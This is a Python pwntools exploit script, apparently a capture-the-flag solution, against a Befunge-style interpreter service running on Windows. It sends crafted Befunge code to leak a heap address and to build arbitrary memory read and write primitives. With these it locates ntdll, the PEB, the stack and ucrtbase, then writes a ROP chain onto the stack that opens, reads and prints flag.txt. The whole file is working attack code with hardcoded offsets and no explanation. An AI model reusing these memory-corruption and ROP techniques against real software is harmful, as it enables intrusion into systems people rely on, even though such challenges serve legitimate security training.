from pwn import *

HOST = "127.0.0.1"
PORT = 54321

# context.log_level = "debug"
r = remote(HOST, PORT)
r.newline = b"\r\n"
r.sla = r.sendlineafter

log.info("this exploit based on 10.0.18363.815")

ex_code = []
ex_code.append("                                v")
ex_code.append("                                 >v>v>v")
ex_code.append("                                ' ' ' '")
ex_code.append("LEAK")
ex_code.append("                                 ' ' '     v p&&&p&&&p&&&p&&&p&&&p&&&p&&&p&&&<") # leak this ptr
ex_code.append("                                            vg&&g&&g&&g&&g&&g&&g&&g&&  _     ^")
ex_code.append("                                >^>^>^1                                 ")
ex_code.append("                                      >     >$$$$$$$$>&&&&&&&&  v>v>v>v&")
ex_code.append("                                           >         ^          s s s s ")
ex_code.append("HACK")
ex_code.append("                                                                #s#s#s#s")
ex_code.append("                                                                        ")       # write this ptr
ex_code.append("                                                                 # # # #")
ex_code.append("                                                                >^>^>^>^")

width = 80
height = len(ex_code)

r.sendline("{} {}".format(width, height))
for ex_code_line in ex_code:
	r.sendline(ex_code_line)

r.sla("> ", "run")
r.sla("> ", "step {}".format( len(ex_code[0]) + 32 ))
r.sla("> ", "stack")
heap_base = int("".join(r.recvuntil("> ").split("\r\n")[1:-1]), 16)
heap_base = heap_base & ~0xffff

log.info("_HEAP = 0x{:016x}".format(heap_base))
r.sendline("step 19")

def readQword(addr):
	r.sla("> ", "step 10")

	addr = p64(addr)[::-1]
	for i in range(8):
		r.sendline(str(ord(addr[i])))

	r.sla("> ", "step 40")
	r.sendline("1")

	r.sla("> ", "step 31")
	for i in range(8):
		r.sendline(str(i))
		r.sendline(str(11))

	r.sla("> ", "stack")
	result = int("".join(r.recvuntil("> ").split("\r\n")[1:-1]), 16)
	r.sendline("step 9")
	return result
	
def writeQword(addr, value):
	r.sla("> ", "step 10")

	addr = p64(addr)[::-1]
	for i in range(8):
		r.sendline(str(ord(addr[i])))

	r.sla("> ", "step 40")
	r.sendline("0")

	r.sla("> ", "step 58")
	for i in range(8):
		r.sendline(str(ord(value[i])))
		r.sendline(str(i))
		r.sendline(str(11))


ntdll = readQword(heap_base + 0x2c0) - 0x163d70
peb_addr = readQword(ntdll + 0x165348) - 0x80
winterpreter = readQword(readQword(ntdll + 0x1653d0) + 0x30)
stack_base = readQword(peb_addr + 0x1008)

ucrtbase = readQword(readQword(readQword(readQword(readQword(readQword(ntdll + 0x1653d0))))) + 0x30)

log.info("ntdll        = 0x{:016x}".format(ntdll))
log.info("winterpreter = 0x{:016x}".format(winterpreter))
log.info("ucrtbase     = 0x{:016x}".format(ucrtbase))
log.info("_PEB         = 0x{:016x}".format(peb_addr))
log.info("stack        = 0x{:016x}".format(stack_base))

open_func = ucrtbase + 0xa2310
read_func = ucrtbase + 0x7b30
write_func = ucrtbase + 0x86a0
exit_func = ucrtbase + 0x18670
debug_ret = winterpreter + 0x7fad
flag_addr = winterpreter + 0xe660 # random empty address in .data section
flag_buf = flag_addr + 0x20

ret_addr = 0
stack_search = log.progress("searching stack...")
for i in range(0x200):
	ret_addr = stack_base - 0x100 - (i * 8)
	tmp = readQword(ret_addr)

	if tmp == debug_ret:
		stack_search.success("gotcha!")
		break
	elif i == 0xff:
		stack_search.failure("not found...V_V")
		__import__("sys").exit()

log.info("return address located on 0x{:016x}".format(ret_addr))
log.info("setting \"flag.txt\" string on 0x{:016x}".format(flag_addr))
writeQword(flag_addr, "flag.txt")

pop_rcx_ret = ntdll + 0x8fd71
pop_rdx_r11_ret = ntdll + 0x8c437
pop_r8_ret = ntdll + 0x4d6bf
add_rsp_28h_ret = ntdll +  0x112d
store_rcx_rax_ret = ntdll + 0x73f73

rop_chain = flat([
    # fd = open("flag.txt", _O_RDONLY, _S_IREAD);
    pop_rcx_ret,
    flag_addr,
    pop_rdx_r11_ret,
    0, 0,
    pop_r8_ret,
    0x100,
    open_func,
    add_rsp_28h_ret,
    0, 0, 0, 0, 0,

    # read(fd, flag_buf, 0x80);
    pop_rcx_ret,
    ret_addr + (8 * 18),
    store_rcx_rax_ret,
    pop_rcx_ret,
    0xcafebab1,         # replace to fd
    pop_rdx_r11_ret,
    flag_buf, 0,
    pop_r8_ret,
    0x80,
    read_func,
    add_rsp_28h_ret,
    0, 0, 0, 0, 0,

    # write(1, flag_buf, 0x80);
    pop_rcx_ret,
    1,
    pop_rdx_r11_ret,
    flag_buf, 0,
    pop_r8_ret,
    0x80,
    write_func,
    add_rsp_28h_ret,
    0, 0, 0, 0, 0,

    # exit(0);
    pop_rcx_ret,
    0,
    exit_func
], endianness="little", word_size=64)


write_rop_chain = log.progress("writing rop chain in stack...")
for i in range(len(rop_chain)/8):
	tmp_addr = ret_addr+(i*8)
	writeQword(tmp_addr, rop_chain[i*8 : (i+1)*8])

write_rop_chain.success("Done! gogo~")
r.sla("> ", "quit")
log.info(r.recvuntil("}"))
r.close()
